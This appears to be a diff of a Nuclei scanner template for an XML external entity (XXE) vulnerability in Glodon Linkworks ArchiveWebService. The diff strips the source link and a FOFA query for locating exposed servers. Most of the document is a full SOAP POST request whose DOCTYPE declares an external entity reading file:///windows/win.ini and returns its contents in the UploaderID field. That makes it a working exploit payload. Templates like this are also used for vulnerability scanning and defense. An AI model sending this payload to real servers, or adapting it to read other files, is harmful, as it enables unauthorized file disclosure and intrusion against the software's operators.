@@ -3,15 +3,11 @@ info:
   name: 广联达Linkworks ArchiveWebService XML实体注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ugdoxlguuwmh1x61'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ugdoxlguuwmh1x61
-    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
 http:
 - raw:
-  - "POST /GB/LK/Document/ArchiveService/ArchiveWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <PostArchiveInfo xmlns=\"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx\">\n      <archiveInfo><!DOCTYPE Archive [\n    <!ENTITY secret SYSTEM \"file:///windows/win.ini\">\n]>\n\n<Archive>\n    <ArchiveInfo>\n        <UploaderID>\n############\n\n\n&secret;\n\n\n##############\n</UploaderID>\n    </ArchiveInfo>\n    <Result>\n        <MainDoc>Document Content</MainDoc>\n    </Result>\n    <DocInfo>\n        <DocTypeID>1</DocTypeID>\n        <DocVersion>1.0</DocVersion>\n    </DocInfo>\n</Archive></archiveInfo>\n      <folderIdList>string</folderIdList>\n      <platId>string</platId>\n    </PostArchiveInfo>\n  </soap:Body>\n</soap:Envelope>"
+  - "POST /GB/LK/Document/ArchiveService/ArchiveWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <PostArchiveInfo xmlns=\"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx\">\n      <archiveInfo><!DOCTYPE Archive [\n    <!ENTITY secret SYSTEM \"file:///windows/win.ini\">\n]>\n\n<Archive>\n    <ArchiveInfo>\n        <UploaderID>\n############\n\n&secret;\n\n##############\n</UploaderID>\n    </ArchiveInfo>\n    <Result>\n        <MainDoc>Document Content</MainDoc>\n    </Result>\n    <DocInfo>\n        <DocTypeID>1</DocTypeID>\n        <DocVersion>1.0</DocVersion>\n    </DocInfo>\n</Archive></archiveInfo>\n      <folderIdList>string</folderIdList>\n      <platId>string</platId>\n    </PostArchiveInfo>\n  </soap:Body>\n</soap:Envelope>"
   redirects: false
   matchers:
   - status:
